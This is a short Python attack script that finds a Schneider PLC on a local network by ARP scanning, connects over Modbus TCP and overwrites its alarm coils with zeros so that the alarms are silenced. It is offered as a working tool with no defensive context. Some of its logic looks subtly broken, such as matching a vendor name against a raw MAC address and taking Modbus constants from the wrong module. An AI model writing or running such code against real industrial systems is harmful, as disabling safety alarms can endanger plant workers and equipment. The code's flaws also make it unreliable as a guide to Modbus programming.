import sys
import time
import scapy.all as scapy
import modbus_tk.modbus_tcp as modbus_tcp

# Define network parameters
NETWORK_PREFIX = "192.168.1."   # Adjust according to your network

# Function to discover the PLC's IP address
def discover_plc_ip():
    print("[*] Scanning network for the PLC...")
    for i in range(1, 255):  # Scan addresses from x.x.x.1 to x.x.x.254
        ip = f"{NETWORK_PREFIX}{i}"
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast / arp_request
        answered_list = scapy.srp(arp_packet, timeout=1, verbose=False)[0]

        for sent, received in answered_list:
            if "Schneider" in received.hwsrc:  # Check if it's a Schneider PLC
                print(f"[+] PLC Found: {received.psrc}")
                return received.psrc  # Return the PLC's IP address

    print("[-] No Schneider PLC found on the network.")
    sys.exit(1)

# Function to suppress alarms on the PLC
def suppress_alarms(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    master = modbus_tcp.TcpMaster(plc_ip, 502)
    master.set_timeout(5.0)

    # Define alarm register/coils (example: coil addresses 10-15 are alarms)
    ALARM_COILS = [10, 11, 12, 13, 14, 15]  # Modify based on actual PLC configuration

    print("[*] Reading current alarm status...")
    try:
        alarm_status = master.execute(1, modbus_tcp.READ_COILS, ALARM_COILS[0], len(ALARM_COILS))
        print(f"[+] Current Alarm Status: {alarm_status}")

        # Suppress alarms by setting these coils to '0'
        suppress_values = [0] * len(ALARM_COILS)
        print("[*] Suppressing alarms...")
        master.execute(1, modbus_tcp.WRITE_MULTIPLE_COILS, ALARM_COILS[0], output_value=suppress_values)

        print("[+] Alarms successfully suppressed! (All set to 0)")
    
    except Exception as e:
        print(f"[-] Error: {e}")

# Main execution flow
if __name__ == "__main__":
    plc_ip = discover_plc_ip()  # Find PLC
    suppress_alarms(plc_ip)  # Suppress alarms